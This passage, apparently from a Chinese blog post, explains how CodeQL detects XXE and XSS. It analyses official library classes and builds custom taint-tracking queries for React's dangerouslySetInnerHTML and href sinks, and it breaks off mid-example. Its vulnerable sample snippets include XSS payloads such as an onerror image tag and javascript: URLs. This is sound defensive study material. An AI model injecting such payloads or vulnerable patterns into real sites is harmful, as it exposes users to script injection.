m.getDeclaringType() <span class="hljs-keyword">instanceof</span> DocumentBuilder and<br>      m.hasName(<span class="hljs-string">&quot;parse&quot;</span>)<br>    )<br>  &#125;<br><br>  override Expr <span class="hljs-title function_">getSink</span><span class="hljs-params">()</span> &#123; result = <span class="hljs-built_in">this</span>.getArgument(<span class="hljs-number">0</span>) &#125;<br><br>  override predicate <span class="hljs-title function_">isSafe</span><span class="hljs-params">()</span> &#123;<br>    SafeDocumentBuilderToDocumentBuilderParseFlow::flowsTo(DataFlow::exprNode(<span class="hljs-built_in">this</span>.getQualifier()))<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而<code>DocumentBuilder</code>则是一个这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentBuilder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RefType</span> &#123;<br>  DocumentBuilder() &#123; <span class="hljs-built_in">this</span>.hasQualifiedName(<span class="hljs-string">&quot;javax.xml.parsers&quot;</span>, <span class="hljs-string">&quot;DocumentBuilder&quot;</span>) &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如此一来我们就能明白，其实这个意思就是找到有没有<code>javax.xml.parsers.DocumentBuilder</code>这个类</p><p>我们接着来看他的<code>isSafe</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">  override predicate <span class="hljs-title function_">isSafe</span><span class="hljs-params">()</span> &#123;<br>    SafeDocumentBuilderToDocumentBuilderParseFlow::flowsTo(DataFlow::exprNode(<span class="hljs-built_in">this</span>.getQualifier()))<br><span class="hljs-comment">//override predicate isSafe() &#123;</span><br><br>  &#125;<br></code></pre></td></tr></table></figure><p>这个谓词的参数是<code>DataFlow::exprNode(this.getQualifier())</code>，也就是这个XML解析器的调用的限定符（也就是<code>DocumentBuilder</code>对象）的数据流节点</p><p>这里检查一个数据流节点是否可以流向一个满足<code>safeDocumentBuilderNode</code>谓词的数据流节点，也就是是否可以流向一个安全的<code>DocumentBuilder</code>对象。</p><p>至于怎么定义xml解释器是不是合适的，就不做分析了</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="官方示例"><a href="#官方示例" class="headerlink" title="官方示例"></a>官方示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><span class="hljs-keyword">import</span> semmle.code.java.security.XssQuery<br><span class="hljs-keyword">import</span> XssFlow::PathGraph<br><br>from XssFlow::PathNode source, XssFlow::PathNode sink<br>where XssFlow::flowPath(source, sink)<br>select sink.getNode(), source, sink, <span class="hljs-string">&quot;Cross-site scripting vulnerability due to a $@.&quot;</span>,<br>  source.getNode(), <span class="hljs-string">&quot;user-provided value&quot;</span><br></code></pre></td></tr></table></figure><p>这里还是使用codeql官方的示例，和上面的步骤一样，我们还是找到了xssSink这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultXssSink</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">XssSink</span> &#123;<br>  DefaultXssSink() &#123;<br>    sinkNode(<span class="hljs-built_in">this</span>, [<span class="hljs-string">&quot;html-injection&quot;</span>, <span class="hljs-string">&quot;js-injection&quot;</span>])<br>    or<br>    <span class="hljs-title function_">exists</span><span class="hljs-params">(MethodCall ma |</span><br><span class="hljs-params">      ma.getMethod()</span> <span class="hljs-keyword">instanceof</span> WritingMethod and<br>      XssVulnerableWriterSourceToWritingMethodFlow::flowToExpr(ma.getQualifier()) and<br>      <span class="hljs-built_in">this</span>.asExpr() = ma.getArgument(_)<br>    )<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">module</span> XssVulnerableWriterSourceToWritingMethodFlowConfig <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DataFlow</span>::ConfigSig &#123;<br>  predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node src)</span> &#123; src.asExpr() <span class="hljs-keyword">instanceof</span> XssVulnerableWriterSource &#125;<br><br>  predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node sink)</span> &#123;<br>    exists(MethodCall ma |<br>      sink.asExpr() = ma.getQualifier() and ma.getMethod() <span class="hljs-keyword">instanceof</span> WritingMethod<br>    )<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们一步步顺着代码往上面追，可以看到这个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">XssVulnerableWriterSource</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MethodCall</span> &#123;<br>  XssVulnerableWriterSource() &#123;<br>    <span class="hljs-built_in">this</span>.getMethod() <span class="hljs-keyword">instanceof</span> ServletResponseGetWriterMethod<br>        <span class="hljs-comment">//向客户端发送数据的方法</span><br>    or<br>    <span class="hljs-built_in">this</span>.getMethod() <span class="hljs-keyword">instanceof</span> ServletResponseGetOutputStreamMethod<br>        <span class="hljs-comment">//像客户端发送二进制数据的方法</span><br>    or<br>    <span class="hljs-title function_">exists</span><span class="hljs-params">(Method m | m = <span class="hljs-built_in">this</span>.getMethod()</span> |<br>      m.getDeclaringType().getQualifiedName() = <span class="hljs-string">&quot;javax.servlet.jsp.JspContext&quot;</span> and<br>      m.getName() = <span class="hljs-string">&quot;getOut&quot;</span><br>           <span class="hljs-comment">//像客户端发送数据的方法</span><br>    )<br>    or<br>    <span class="hljs-built_in">this</span>.getMethod() <span class="hljs-keyword">instanceof</span> FacesGetResponseWriterMethod<br>    or<br>    <span class="hljs-built_in">this</span>.getMethod() <span class="hljs-keyword">instanceof</span> FacesGetResponseStreamMethod<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现就是找到能向客户端发送数据的方法作为source</p><p>分析完了source，再来看sink</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node sink)</span> &#123;<br>  exists(MethodCall ma |<br>    sink.asExpr() = ma.getQualifier() and ma.getMethod() <span class="hljs-keyword">instanceof</span> WritingMethod<br>  )<br>&#125;<br></code></pre></td></tr></table></figure><p>而这里的<code>WritingMethod</code>是这个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WritingMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span> &#123;<br>  WritingMethod() &#123;<br>    <span class="hljs-built_in">this</span>.getDeclaringType().getAnAncestor().hasQualifiedName(<span class="hljs-string">&quot;java.io&quot;</span>, _) and<br>    (<br>      <span class="hljs-built_in">this</span>.getName().matches(<span class="hljs-string">&quot;print%&quot;</span>) or<br>      <span class="hljs-built_in">this</span>.getName() = <span class="hljs-string">&quot;append&quot;</span> or<br>      <span class="hljs-built_in">this</span>.getName() = <span class="hljs-string">&quot;format&quot;</span> or<br>      <span class="hljs-built_in">this</span>.getName() = <span class="hljs-string">&quot;write&quot;</span><br>    )<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现这里其实就是可以往服务端写入的一些代码，也就是将数据以某种格式或方式输出的方法</p><p>题外话:</p><p>可以注意到一个有意思的现象，我们可以看到不管是xxe还是xss，都是将这个作为source</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node source)</span> &#123; source <span class="hljs-keyword">instanceof</span> ThreatModelFlowSource &#125;<br></code></pre></td></tr></table></figure><p>这里我一直把threat堪称thread当成继承当前的线程来用，实际上是威胁，跟进去查看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreatModelFlowSource</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>  ThreatModelFlowSource() &#123;<br>    exists(string kind |<br>      <span class="hljs-comment">// Specific threat model.</span><br>      currentThreatModel(kind) and<br>      (<span class="hljs-built_in">this</span>.(SourceNode).getThreatModel() = kind or <span class="hljs-title function_">sourceNode</span><span class="hljs-params">(<span class="hljs-built_in">this</span>, kind)</span>)<br>    )<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们对<code>currentThreatModel</code>感兴趣</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">predicate <span class="hljs-title function_">currentThreatModel</span><span class="hljs-params">(string kind)</span> &#123;<br>  threatModelEnabled(kind)<br>  or<br>  <span class="hljs-comment">// For any threat model kind not mentioned in the configuration or grouping tables, its state of</span><br>  <span class="hljs-comment">// enablement is controlled only by the entries that specifiy the &quot;all&quot; kind.</span><br>  not <span class="hljs-title function_">knownThreatModel</span><span class="hljs-params">(kind)</span> and <span class="hljs-title function_">threatModelEnabled</span><span class="hljs-params">(<span class="hljs-string">&quot;all&quot;</span>)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>跟进<code>threatModelEnabled</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> predicate <span class="hljs-title function_">threatModelEnabled</span><span class="hljs-params">(string kind)</span> &#123;<br>  <span class="hljs-comment">// Find the highest-priority configuration row whose `kind` column includes the specified threat</span><br>  <span class="hljs-comment">// model kind. If such a row exists and its `enabled` column is `true`, then the threat model is</span><br>  <span class="hljs-comment">// enabled.</span><br>  knownThreatModel(kind) and<br>  <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">boolean</span> enabled, <span class="hljs-type">int</span> priority |</span><br><span class="hljs-params">    exists(string configuredKind | configuredKind = getParentThreatModel*(kind)</span> |<br>      threatModelConfiguration(configuredKind, enabled, priority)<br>    )<br>  |<br>    enabled order by priority<br>  ) = <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>threatModelConfiguration的官方解释是</p><blockquote><p><strong>predicate threatModelConfiguration(string kind, boolean enable, int priority)</strong></p><p>Holds configuration entries to specify which threat models are enabled.</p><ul><li><code>kind</code> - Specifies the threat model to configure. This can be the name of a specific threat model (for example, <code>environment</code>), a group (<code>local</code>), or <code>all</code>.</li><li><code>enable</code> - <code>true</code> to enable the specified threat model (and its children), or <code>false</code> to disable it.</li><li><code>priority</code> - The order in which the configuration should be applied. Lower values are applied first.</li></ul><p>The final configuration is the result of processing each row in ascending order of its <code>priority</code> column. For example:</p><ul><li><code>&#123; kind: &quot;all&quot;, enable: true, priority: 0 &#125;</code></li><li><code>&#123; kind: &quot;remote&quot;, enable: false, priority: 1 &#125;</code></li><li><code>&#123; kind: &quot;environment&quot;, enable: true, priority: 2 &#125;</code> This configuration first enables all threat models, then disables the <code>remote</code> group, and finally re-enables the <code>environment</code> threat model.</li></ul></blockquote><h3 id="React中的Xss类型"><a href="#React中的Xss类型" class="headerlink" title="React中的Xss类型"></a>React中的Xss类型</h3><p>React应用的XSS的产生情况一般有：</p><ul><li><p>调用dangerouslySetInnerHTML</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">React</span>.<span class="hljs-title">Component</span> </span>&#123;<br>  render() &#123;<br>    <span class="hljs-keyword">return</span> &lt;div<br>        dangerouslySetInnerHTML=&#123;&#123;html:&#x27;&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>/onerror=<span class="hljs-string">&quot;alert(1)&quot;</span>/&gt;&#x27;&#125;&#125;<br>    &gt;&lt;/div&gt;;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">ReactDOM</span>.render(<br>  &lt;<span class="hljs-type">Hello</span> name=<span class="hljs-string">&quot;World&quot;</span> /&gt;,<br>  document.getElementById(&#x27;container&#x27;)<br>);<br></code></pre></td></tr></table></figure></li></ul><p>直接将恶意html渲染到DOM中；</p><ul><li><p>a标签的链接判断不严格</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scala">const userWebsite = <span class="hljs-string">&quot;javascript:alert(&#x27;Hacked!&#x27;);&quot;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserProfilePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">React</span>.<span class="hljs-title">Component</span> </span>&#123;<br>  render() &#123;<br>    <span class="hljs-keyword">return</span> (<br>      &lt;a href=&#123;userWebsite&#125;&gt;<span class="hljs-type">My</span> <span class="hljs-type">Website</span>&lt;/a&gt;<br>    )<br>  &#125;<br>&#125;<br><br><span class="hljs-type">ReactDOM</span>.render(&lt;<span class="hljs-type">UserProfilePage</span> /&gt;, document.querySelector(<span class="hljs-string">&quot;#app&quot;</span>));<br></code></pre></td></tr></table></figure></li></ul><p>a标签对于链接缺少过滤，可以通过插入javascript类的url来实现oneclick XSS.</p><ul><li><p>直接调用innerHTML&#x2F;outerHTML</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">var <span class="hljs-attribute">x</span>=document.createElement(&#x27;div&#x27;)<br>x.<span class="hljs-attribute">innerHTML</span>=<span class="hljs-string">&quot;user controllable data&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>直接设置href</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">var <span class="hljs-attribute">x</span>=document.createElement(&#x27;a&#x27;)<br>x.<span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p>参数注入(注入dangerouslySetInnerHTML的情况)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> r=&#123;...input&#125;<br><span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">...r</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>)<br></code></pre></td></tr></table></figure></li></ul><h4 id="CodeQL代码实现"><a href="#CodeQL代码实现" class="headerlink" title="CodeQL代码实现"></a>CodeQL代码实现</h4><h5 id="dangerouly"><a href="#dangerouly" class="headerlink" title="dangerouly"></a>dangerouly</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">override predicate is<span class="hljs-constructor">Source(DataFlow::Node <span class="hljs-params">nd</span>)</span>&#123;<br>       not (nd.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span> instanceof ConstantExpr)<br>       <span class="hljs-keyword">and</span> not exists(nd.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;icon&quot;</span>)</span>)<br>    &#125;<br></code></pre></td></tr></table></figure><p>React应用而言Source点其实不是很容易确定，而且盲目设置Source来源于location.hash&#x2F;XHR如果<code>isAdditionalTaintStep</code>函数设置不好的话很难能达到预期结果。因此我仅仅判断了Source是否是常量的情形。</p><p>而第二段语句是为了排除dangerouslySetInnerHTML来加载svg图片时的场景</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scala"> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReactDangerousSetInnerHTMLSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DataFlow</span></span>::<span class="hljs-type">Node</span> &#123;<br>   <span class="hljs-type">ReactDangerousSetInnerHTMLSinks</span>() &#123;<br>    exists(<span class="hljs-type">JSXAttribute</span> attr |<br>      attr.getName() = <span class="hljs-string">&quot;dangerouslySetInnerHTML&quot;</span> and attr.getValue() = <span class="hljs-keyword">this</span>.asExpr()<br>    )<br><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>sink的话就只需要验证是不是一个jsx节点并检测dangerousSetInnerHtml</p><p>因为我们想要完整的利用链子而不是简单的利用链，我们需要把嵌在html里面的语句也拿出来找一遍，于是我们需要用到<code>isAdditionalTaintStep</code></p><p>下面是其官方解释</p><blockquote><p>Holds if data may flow from <code>node1</code> to <code>node2</code> in addition to the normal data-flow steps.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">override predicate <span class="hljs-title function_">isAdditionalTaintStep</span><span class="hljs-params">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;<br>        exists(DataFlow::ObjectLiteralNode obj, DataFlow::Node html_value |<span class="hljs-comment">//这里ObjectLiteralNode是，对象字面量表达式是一种用花括号括起来的键值对列表</span><br>        obj.hasPropertyWrite(<span class="hljs-string">&quot;__html&quot;</span>, html_value) and<span class="hljs-comment">//__表示一个值是html代码而不是普通的文本</span><br>        succ = obj <span class="hljs-type">and</span><br>        <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> html_value<br>        )<br>    &#125;<br></code></pre></td></tr></table></figure><p>最终语句如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javascript<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactDangerousSetInnerHTMLSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Node &#123;<br>   ReactDangerousSetInnerHTMLSinks() &#123;<br>    exists(JSXAttribute attr |<br>      attr.getName() = <span class="hljs-string">&quot;dangerouslySetInnerHTML&quot;</span> and attr.getValue() = <span class="hljs-built_in">this</span>.asExpr()<br>    )<br><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactSetInnerHtmlTracker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TaintTracking</span>::Configuration&#123;<br>    ReactSetInnerHtmlTracker() &#123;<br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;ReactSetInnerHtmlTracker&quot;</span><br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node nd)</span>&#123;<br>       not (nd.asExpr() <span class="hljs-keyword">instanceof</span> ConstantExpr)<br>       and not <span class="hljs-title function_">exists</span><span class="hljs-params">(nd.toString()</span>.toLowerCase().indexOf(<span class="hljs-string">&quot;icon&quot;</span>))<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node nd)</span>&#123;<br>        nd <span class="hljs-keyword">instanceof</span> ReactDangerousSetInnerHTMLSinks<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isAdditionalTaintStep</span><span class="hljs-params">(DataFlow::Node pred, DataFlow::Node succ)</span> &#123;<br>        exists(DataFlow::ObjectLiteralNode obj, DataFlow::Node html_value |<br>        obj.hasPropertyWrite(<span class="hljs-string">&quot;__html&quot;</span>, html_value) <span class="hljs-type">and</span><br>        <span class="hljs-variable">succ</span> <span class="hljs-operator">=</span> obj <span class="hljs-type">and</span><br>        <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> html_value<br>        )<br>    &#125;<br>&#125;<br><br><br><br>from ReactSetInnerHtmlTracker pt, DataFlow::Node source, DataFlow::Node sink<br>where pt.hasFlow(source, sink)<br>select source,sink<br></code></pre></td></tr></table></figure><h5 id="a标签过滤不严"><a href="#a标签过滤不严" class="headerlink" title="a标签过滤不严"></a>a标签过滤不严</h5><p>对应的情况是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">const</span> <span class="hljs-variable">userWebsite</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javascript:alert(&#x27;Hacked!&#x27;);&quot;</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProfilePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">React</span>.Component &#123;<br>  render() &#123;<br>    <span class="hljs-keyword">return</span> (<br>      &lt;a href=&#123;userWebsite&#125;&gt;My Website&lt;/a&gt;<br>    )<br>  &#125;<br>&#125;<br><br>ReactDOM.render(&lt;UserProfilePage /&gt;, document.querySelector(<span class="hljs-string">&quot;#app&quot;</span>))<br></code></pre></td></tr></table></figure><p>会让恶意代码直接插入，所以我们仿照前面的方法，继承类名字改为href</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReactSetHrefSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DataFlow</span></span>::<span class="hljs-type">Node</span> &#123;<br>   <span class="hljs-type">ReactSetHrefSinks</span>() &#123;<br>    exists(<span class="hljs-type">JSXAttribute</span> attr |<br>      attr.getName() = <span class="hljs-string">&quot;href&quot;</span> and attr.getValue() = <span class="hljs-keyword">this</span>.asExpr()<br>    )<br><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于我们之前设置的属性是针对特定情况的，所以我们这里不需要实现<code>isAdditionalTaintStep</code>方法了</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> javascript<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReactSetHrefSinks</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DataFlow</span></span>::<span class="hljs-type">Node</span> &#123;<br>   <span class="hljs-type">ReactSetHrefSinks</span>() &#123;<br>    exists(<span class="hljs-type">JSXAttribute</span> attr |<br>      attr.getName() = <span class="hljs-string">&quot;href&quot;</span> and attr.getValue() = <span class="hljs-keyword">this</span>.asExpr()<br>    )<br><br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReactSetHrefTracker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">TaintTracking</span></span>::<span class="hljs-type">Configuration</span>&#123;<br>    <span class="hljs-type">ReactSetHrefTracker</span>() &#123;<br>        <span class="hljs-keyword">this</span> = <span class="hljs-string">&quot;ReactSetHrefTracker&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">override</span> predicate isSource(<span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> nd)&#123;<br>       exists(|<br>       not (nd.asExpr() instanceof <span class="hljs-type">ConstantExpr</span>)<br>       and not exists(nd.toString().toLowerCase().indexOf(<span class="hljs-string">&quot;icon&quot;</span>))<br>       )<br>    &#125;<br><br>    <span class="hljs-keyword">override</span> predicate isSink(<span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> nd)&#123;<br>      nd instanceof <span class="hljs-type">ReactSetHrefSinks</span><br>    &#125;<br><br>&#125;<br><br><br><br>from <span class="hljs-type">ReactSetHrefTracker</span> pt, <span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> source, <span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> sink<br>where pt.hasFlow(source, sink)<br>select source,sink<br></code></pre></td></tr></table></figure><h5 id="直接调用innerHTML-x2F-outerHTML"><a href="#直接调用innerHTML-x2F-outerHTML" class="headerlink" title="直接调用innerHTML&#x2F;outerHTML"></a>直接调用innerHTML&#x2F;outerHTML</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">var <span class="hljs-attribute">x</span>=document.createElement(&#x27;div&#x27;)<br>x.<span 